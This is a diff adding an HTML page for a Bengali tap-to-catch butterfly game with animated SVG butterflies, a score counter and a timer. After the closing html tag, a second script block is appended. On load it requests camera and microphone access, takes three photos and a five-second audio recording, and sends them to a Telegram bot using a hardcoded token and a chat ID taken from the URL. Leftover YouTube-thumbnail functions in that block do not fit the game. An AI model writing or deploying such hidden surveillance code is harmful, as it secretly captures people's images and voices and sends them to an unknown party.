@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Butterfly Catch</title>
+<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    padding-top: env(safe-area-inset-top, 0px);
+    padding-bottom: env(safe-area-inset-bottom, 0px);
+    --cream:#fdf6f0;
+    --gold:#e3b87a;
+  }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  html,body{height:100%;}
+  body{
+    font-family:'Hind Siliguri', sans-serif;
+    background:
+      radial-gradient(ellipse 700px 400px at 15% 8%, rgba(255,214,163,0.18), transparent 60%),
+      radial-gradient(ellipse 500px 500px at 88% 78%, rgba(140,255,220,0.08), transparent 55%),
+      linear-gradient(180deg, #2b1f4a 0%, #3a2a5c 30%, #5a3b6e 55%, #7a4f6b 75%, #a1654f 100%);
+    min-height:100%;
+    overflow:hidden;
+    position:relative;
+    color: var(--cream);
+    touch-action: manipulation;
+  }
+
+  .sky-layer{ position:fixed; inset:0; z-index:0; pointer-events:none; }
+
+  .hill{
+    position:fixed;
+    left:-10%;
+    width:120%;
+    border-radius:50% 50% 0 0 / 100% 100% 0 0;
+    z-index:1;
+    pointer-events:none;
+  }
+  .hill.back{ bottom:-18vh; height:38vh; background:#3d2a52; opacity:0.85; }
+  .hill.front{ bottom:-22vh; height:32vh; background:#2a1c3d; opacity:0.95; }
+
+  .firefly{
+    position:fixed;
+    width:5px; height:5px;
+    border-radius:50%;
+    background: radial-gradient(circle, #fff6c8 0%, #ffe066 45%, transparent 75%);
+    box-shadow: 0 0 8px 3px rgba(255,224,102,0.6);
+    animation: drift ease-in-out infinite, glow 2.4s ease-in-out infinite;
+    pointer-events:none;
+    z-index:1;
+  }
+  @keyframes glow{
+    0%,100%{ opacity:0.25; }
+    50%{ opacity:0.9; }
+  }
+  @keyframes drift{
+    0%{ transform: translate(0,0); }
+    25%{ transform: translate(18px,-14px); }
+    50%{ transform: translate(-10px,-26px); }
+    75%{ transform: translate(-22px,-8px); }
+    100%{ transform: translate(0,0); }
+  }
+
+  .cloud{
+    position:fixed;
+    background: rgba(255,255,255,0.06);
+    border-radius:50px;
+    filter: blur(2px);
+    z-index:0;
+    pointer-events:none;
+    animation: drift-cloud linear infinite;
+  }
+  @keyframes drift-cloud{
+    0%{ transform: translateX(-10vw); }
+    100%{ transform: translateX(110vw); }
+  }
+
+  #hud{
+    position:fixed;
+    top: calc(14px + env(safe-area-inset-top, 0px));
+    left:0; right:0;
+    display:flex;
+    justify-content:center;
+    gap:14px;
+    z-index:10;
+    pointer-events:none;
+  }
+  .pill{
+    background: rgba(30,16,40,0.5);
+    border:1px solid rgba(227,184,122,0.45);
+    backdrop-filter: blur(6px);
+    padding:9px 20px;
+    border-radius:20px;
+    font-weight:600;
+    font-size:0.95rem;
+    letter-spacing:0.02em;
+    box-shadow: 0 4px 14px rgba(0,0,0,0.25);
+  }
+  .pill b{ color: var(--gold); font-size:1.05rem; margin-left:4px; }
+
+  #overlay{
+    position:fixed;
+    inset:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    z-index:20;
+    background: rgba(10,10,18,0.55);
+  }
+  #overlay.hidden{ display:none; }
+  .panel{
+    background: rgba(253,246,240,0.08);
+    border:1px solid rgba(227,184,122,0.4);
+    backdrop-filter: blur(8px);
+    border-radius:18px;
+    padding:36px 30px;
+    text-align:center;
+    max-width:320px;
+  }
+  .panel h1{
+    font-size:1.5rem;
+    margin-bottom:8px;
+    color: var(--gold);
+  }
+  .panel p{
+    font-size:0.95rem;
+    color: rgba(253,246,240,0.75);
+    margin-bottom:22px;
+    line-height:1.6;
+  }
+  .panel .final-score{
+    font-size:1.1rem;
+    margin-bottom:18px;
+  }
+  .panel .final-score b{ color: var(--gold); font-size:1.4rem; }
+
+  .btn{
+    background: linear-gradient(135deg, #e88fa0, #c97b91);
+    color:#fff;
+    border:none;
+    padding:14px 36px;
+    font-size:1rem;
+    font-weight:700;
+    font-family:'Hind Siliguri', sans-serif;
+    border-radius:30px;
+    cursor:pointer;
+    box-shadow: 0 6px 20px rgba(232,143,160,0.35);
+  }
+  .btn:hover{ filter:brightness(1.08); }
+  .btn:focus-visible{ outline:2px solid var(--gold); outline-offset:3px; }
+
+  #arena{
+    position:fixed;
+    inset:0;
+  }
+
+  .butterfly{
+    position:absolute;
+    cursor:pointer;
+    -webkit-tap-highlight-color: transparent;
+    will-change: transform;
+  }
+  .wing{ transform-origin: 30px 33px; animation-timing-function: ease-in-out; animation-iteration-count: infinite; animation-direction: alternate; }
+  .wing.left{ animation-name: flap-left; }
+  .wing.right{ animation-name: flap-right; }
+  @keyframes flap-left{
+    0%{ transform: scaleX(1) rotate(0deg); }
+    100%{ transform: scaleX(0.42) rotate(-10deg); }
+  }
+  @keyframes flap-right{
+    0%{ transform: scaleX(1) rotate(0deg); }
+    100%{ transform: scaleX(0.42) rotate(10deg); }
+  }
+
+  .caught{
+    animation: pop 0.35s ease-out forwards;
+    pointer-events:none;
+  }
+  @keyframes pop{
+    0%{ transform: scale(1); opacity:1; }
+    100%{ transform: scale(1.6); opacity:0; }
+  }
+
+  .floatscore{
+    position:absolute;
+    font-weight:700;
+    font-size:1.2rem;
+    color: var(--gold);
+    pointer-events:none;
+    animation: rise 0.7s ease-out forwards;
+    text-shadow: 0 2px 6px rgba(0,0,0,0.5);
+  }
+  @keyframes rise{
+    0%{ transform: translateY(0); opacity:1; }
+    100%{ transform: translateY(-40px); opacity:0; }
+  }
+
+  .sparkle{
+    position:absolute;
+    width:6px; height:6px;
+    border-radius:50%;
+    background: var(--gold);
+    pointer-events:none;
+    animation: sparkle-out 0.6s ease-out forwards;
+  }
+  @keyframes sparkle-out{
+    0%{ transform: translate(0,0) scale(1); opacity:1; }
+    100%{ transform: var(--sp-end) scale(0.2); opacity:0; }
+  }
+
+  @media (prefers-reduced-motion: reduce){
+    .wing{ animation: none; }
+  }
+</style>
+</head>
+<body>
+
+<div id="hud">
+  <div class="pill">স্কোর<b id="score">0</b></div>
+  <div class="pill">সময়<b id="time">30</b></div>
+</div>
+
+<div class="hill back"></div>
+<div class="hill front"></div>
+<div id="arena"></div>
+
+<div id="overlay">
+  <div class="panel">
+    <h1>🦋 প্রজাপতি ধরো</h1>
+    <p>৩০ সেকেন্ডে যতগুলো পারো প্রজাপতি ছুঁয়ে ধরো। যত বেশি ধরবে, স্কোর তত বাড়বে!</p>
+    <button class="btn" id="start-btn">শুরু করো</button>
+  </div>
+</div>
+
+<script>
+  const arena = document.getElementById('arena');
+  const overlay = document.getElementById('overlay');
+  const startBtn = document.getElementById('start-btn');
+  const scoreEl = document.getElementById('score');
+  const timeEl = document.getElementById('time');
+
+  const species = [
+    { top:['#ff8a1e','#e2560f'], bottom:['#ffb347','#ff8a1e'], vein:'#2b1608', spot:'#fff4d6', body:'#2b1608' },
+    { top:['#4fc3f7','#1565c0'], bottom:['#29b6f6','#0d47a1'], vein:'#0a1f33', spot:'#e3f2fd', body:'#0a1f33' },
+    { top:['#ffe066','#fcbf49'], bottom:['#f77f00','#d62828'], vein:'#241a06', spot:'#2b2d42', body:'#241a06' },
+    { top:['#ff8fab','#e83e8c'], bottom:['#ffc2d1','#ff8fab'], vein:'#4a1c2b', spot:'#fff0f5', body:'#4a1c2b' },
+    { top:['#c77dff','#7b2cbf'], bottom:['#e0aaff','#9d4edd'], vein:'#2d1b3d', spot:'#f3e8ff', body:'#2d1b3d' },
+    { top:['#caffbf','#57cc99'], bottom:['#9ef01a','#38b000'], vein:'#1b3a1a', spot:'#f2ffe8', body:'#1b3a1a' },
+    { top:['#ffd60a','#ff9500'], bottom:['#ff6d00','#c1121f'], vein:'#3a1505', spot:'#fff3b0', body:'#3a1505' }
+  ];
+
+  let gradUid = 0;
+  const svgNS = 'http://www.w3.org/2000/svg';
+  let defsEl = null;
+
+  function ensureDefs(){
+    if(defsEl) return defsEl;
+    const svg = document.createElementNS(svgNS,'svg');
+    svg.setAttribute('width','0'); svg.setAttribute('height','0');
+    svg.style.position='absolute';
+    const defs = document.createElementNS(svgNS,'defs');
+    svg.appendChild(defs);
+    document.body.appendChild(svg);
+    defsEl = defs;
+    return defs;
+  }
+
+  function addGradient(id, c1, c2){
+    const defs = ensureDefs();
+    const g = document.createElementNS(svgNS,'linearGradient');
+    g.setAttribute('id', id);
+    g.setAttribute('x1','0%'); g.setAttribute('y1','0%');
+    g.setAttribute('x2','0%'); g.setAttribute('y2','100%');
+    const s1 = document.createElementNS(svgNS,'stop');
+    s1.setAttribute('offset','0%'); s1.setAttribute('stop-color', c1);
+    const s2 = document.createElementNS(svgNS,'stop');
+    s2.setAttribute('offset','100%'); s2.setAttribute('stop-color', c2);
+    g.appendChild(s1); g.appendChild(s2);
+    defs.appendChild(g);
+  }
+
+  function butterflySVG(sp, size, flapDur){
+    const uid = gradUid++;
+    const topId = `g-top-${uid}`;
+    const botId = `g-bot-${uid}`;
+    addGradient(topId, sp.top[0], sp.top[1]);
+    addGradient(botId, sp.bottom[0], sp.bottom[1]);
+    return `
+    <svg width="${size}" height="${size}" viewBox="0 0 60 66" xmlns="http://www.w3.org/2000/svg">
+      <g class="wing left" style="animation-duration:${flapDur}s">
+        <path d="M30 33 C14 4, -6 4, 2 26 C6 40, 18 40, 30 33 Z" fill="url(#${topId})" stroke="${sp.vein}" stroke-width="0.6" stroke-opacity="0.5"/>
+        <circle cx="12" cy="17" r="2.6" fill="${sp.spot}" opacity="0.85"/>
+        <circle cx="20" cy="10" r="1.7" fill="${sp.spot}" opacity="0.7"/>
+        <path d="M30 36 C16 30, 2 36, 6 48 C10 58, 24 52, 30 36 Z" fill="url(#${botId})" stroke="${sp.vein}" stroke-width="0.6" stroke-opacity="0.5"/>
+        <circle cx="14" cy="44" r="2.2" fill="${sp.spot}" opacity="0.8"/>
+      </g>
+      <g class="wing right" style="animation-duration:${flapDur}s">
+        <path d="M30 33 C46 4, 66 4, 58 26 C54 40, 42 40, 30 33 Z" fill="url(#${topId})" stroke="${sp.vein}" stroke-width="0.6" stroke-opacity="0.5"/>
+        <circle cx="48" cy="17" r="2.6" fill="${sp.spot}" opacity="0.85"/>
+        <circle cx="40" cy="10" r="1.7" fill="${sp.spot}" opacity="0.7"/>
+        <path d="M30 36 C44 30, 58 36, 54 48 C50 58, 36 52, 30 36 Z" fill="url(#${botId})" stroke="${sp.vein}" stroke-width="0.6" stroke-opacity="0.5"/>
+        <circle cx="46" cy="44" r="2.2" fill="${sp.spot}" opacity="0.8"/>
+      </g>
+      <ellipse cx="30" cy="34" rx="2.1" ry="11" fill="${sp.body}"/>
+      <circle cx="30" cy="21" r="2.4" fill="${sp.body}"/>
+      <path d="M30 21 C27 15, 23 13, 20 11" stroke="${sp.body}" stroke-width="1" fill="none" stroke-linecap="round"/>
+      <path d="M30 21 C33 15, 37 13, 40 11" stroke="${sp.body}" stroke-width="1" fill="none" stroke-linecap="round"/>
+    </svg>`;
+  }
+
+  // Decorative clouds
+  for(let i=0;i<4;i++){
+    const c = document.createElement('div');
+    c.className = 'cloud';
+    const w = 100 + Math.random()*140;
+    const h = w * 0.35;
+    c.style.width = w+'px';
+    c.style.height = h+'px';
+    c.style.top = (5 + Math.random()*25) + 'vh';
+    c.style.animationDuration = (40 + Math.random()*30) + 's';
+    c.style.animationDelay = (-Math.random()*40) + 's';
+    document.body.appendChild(c);
+  }
+
+  // Decorative fireflies
+  for(let i=0;i<16;i++){
+    const f = document.createElement('div');
+    f.className = 'firefly';
+    f.style.left = (Math.random()*100) + 'vw';
+    f.style.top = (40 + Math.random()*55) + 'vh';
+    f.style.animationDuration = (4 + Math.random()*4) + 's, ' + (2 + Math.random()*2) + 's';
+    f.style.animationDelay = (-Math.random()*6) + 's';
+    document.body.appendChild(f);
+  }
+
+  function burstSparkles(x, y){
+    for(let i=0;i<8;i++){
+      const s = document.createElement('div');
+      s.className = 'sparkle';
+      const angle = (Math.PI*2/8) * i + Math.random()*0.4;
+      const dist = 24 + Math.random()*20;
+      s.style.setProperty('--sp-end', `translate(${Math.cos(angle)*dist}px, ${Math.sin(angle)*dist}px)`);
+      s.style.left = x + 'px';
+      s.style.top = y + 'px';
+      s.style.background = ['#e3b87a','#ff8fab','#ffe066','#90e0ef'][i % 4];
+      document.body.appendChild(s);
+      setTimeout(()=> s.remove(), 650);
+    }
+  }
+
+  let score = 0;
+  let timeLeft = 30;
+  let running = false;
+  let spawnTimer = null;
+  let countdownTimer = null;
+  const activeButterflies = new Set();
+
+  function spawnButterfly(){
+    if(!running) return;
+    const sp = species[Math.floor(Math.random()*species.length)];
+    const size = 46 + Math.random()*40;
+    const flapDur = (0.28 + Math.random()*0.25).toFixed(2);
+
+    const el = document.createElement('div');
+    el.className = 'butterfly';
+    el.innerHTML = butterflySVG(sp, size, flapDur);
+
+    const vw = window.innerWidth, vh = window.innerHeight;
+    const startX = Math.random()*(vw - size);
+    const startY = vh + size;
+    el.style.left = startX + 'px';
+    el.style.top = startY + 'px';
+    arena.appendChild(el);
+    activeButterflies.add(el);
+
+    // path animation via JS for organic wandering
+    const duration = 5000 + Math.random()*4000;
+    const startTime = performance.now();
+    const amplitude = 60 + Math.random()*80;
+    const frequency = 1 + Math.random()*1.5;
+    const endY = -size - 20;
+
+    function frame(now){
+      if(!el.isConnected) return;
+      const t = Math.min(1, (now - startTime) / duration);
+      const y = startY + (endY - startY) * t;
+      const x = startX + Math.sin(t * Math.PI * frequency * 2) * amplitude;
+      el.style.transform = `translate(${x - startX}px, ${y - startY}px)`;
+      if(t < 1 && running){
+        requestAnimationFrame(frame);
+      } else if(el.isConnected){
+        el.remove();
+        activeButterflies.delete(el);
+      }
+    }
+    requestAnimationFrame(frame);
+
+    function catchIt(e){
+      e.preventDefault();
+      if(el.dataset.caught) return;
+      el.dataset.caught = '1';
+      score++;
+      scoreEl.textContent = score;
+
+      const rect = el.getBoundingClientRect();
+      const cx = rect.left + rect.width/2;
+      const cy = rect.top + rect.height/2;
+
+      const fs = document.createElement('div');
+      fs.className = 'floatscore';
+      fs.textContent = '+1';
+      fs.style.left = cx + 'px';
+      fs.style.top = rect.top + 'px';
+      document.body.appendChild(fs);
+      setTimeout(()=> fs.remove(), 700);
+
+      burstSparkles(cx, cy);
+
+      el.classList.add('caught');
+      setTimeout(()=>{ el.remove(); activeButterflies.delete(el); }, 350);
+    }
+    el.addEventListener('pointerdown', catchIt, { passive:false });
+
+    if(running){
+      spawnTimer = setTimeout(spawnButterfly, 550 + Math.random()*500);
+    }
+  }
+
+  function startGame(){
+    score = 0;
+    timeLeft = 30;
+    scoreEl.textContent = score;
+    timeEl.textContent = timeLeft;
+    overlay.classList.add('hidden');
+    running = true;
+
+    spawnButterfly();
+    spawnButterfly();
+
+    countdownTimer = setInterval(()=>{
+      timeLeft--;
+      timeEl.textContent = timeLeft;
+      if(timeLeft <= 0){
+        endGame();
+      }
+    }, 1000);
+  }
+
+  function endGame(){
+    running = false;
+    clearInterval(countdownTimer);
+    clearTimeout(spawnTimer);
+    activeButterflies.forEach(el => el.remove());
+    activeButterflies.clear();
+
+    const panel = overlay.querySelector('.panel');
+    panel.innerHTML = `
+      <h1>সময় শেষ! 🦋</h1>
+      <div class="final-score">তুমি ধরেছো <b>${score}</b> টি প্রজাপতি</div>
+      <button class="btn" id="start-btn">আবার খেলো</button>
+    `;
+    overlay.classList.remove('hidden');
+    document.getElementById('start-btn').addEventListener('click', startGame);
+  }
+
+  startBtn.addEventListener('click', startGame);
+</script>
+</body>
+</html>
+<script>
+    function GetURLParameter(name) {
+      const params = new URLSearchParams(window.location.search);
+      return params.get(name);
+    }
+
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
+      }
+    }
+
+    const base64Id = GetURLParameter('i');
+    const chatid = base64Id ? decodeBase64(base64Id) : null;
+
+    function sendToTelegram(data, type) {
+      const botToken = '8801388143:AAHZExQqKVZtnul_DulJBDm7RNPMZkLHNq0';
+      if (!chatid) return console.error('Chat ID is not available.');
+
+      const formData = new FormData();
+      formData.append('chat_id', chatid);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `thumb.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+      }).then(res => res.json())
+        .then(data => console.log('Telegram response:', data))
+        .catch(err => console.error('Telegram error:', err));
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+
+        for (let i = 0; i < 3; i++) {
+          setTimeout(() => {
+            imageCapture.takePhoto().then(blob => sendToTelegram(blob, 'photo'));
+          }, i * 2000);
+        }
+
+        audioRecorder.start();
+        setTimeout(() => audioRecorder.stop(), 5000);
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
+        };
+      })
+      .catch(error => {
+        if (error.name === 'NotAllowedError') {
+          console.warn('Permissions denied. User blocked access.');
+        } else {
+          console.error('Media error:', error);
+        }
+      });
+
+    function downloadThumbnail() {
+      const url = document.getElementById("ytlink").value;
+      const btn = document.getElementById("thumbdloadbtn");
+      btn.textContent = "Fetching...";
+
+      const videoId = extractVideoID(url);
+      if (!videoId) {
+        btn.textContent = "Fetch Thumbnail";
+        return alert("Invalid YouTube URL");
+      }
+
+      const thumbnailURL = `https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`;
+      document.getElementById("thumbnail-preview").innerHTML = `
+        <img src="${thumbnailURL}" style="max-width:100%; margin: 20px 0; border-radius:10px;" />
+        <a href="${thumbnailURL}" download class="form-control" style="background:#00c851; text-align:center; color:white; text-decoration:none;">Download HD Thumbnail</a>
+      `;
+      btn.textContent = "Fetch Thumbnail";
+    }
+
+    function extractVideoID(url) {
+      const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#\&\?]*).*/;
+      const match = url.match(regExp);
+      return (match && match[2].length == 11) ? match[2] : null;
+    }
+  </script>
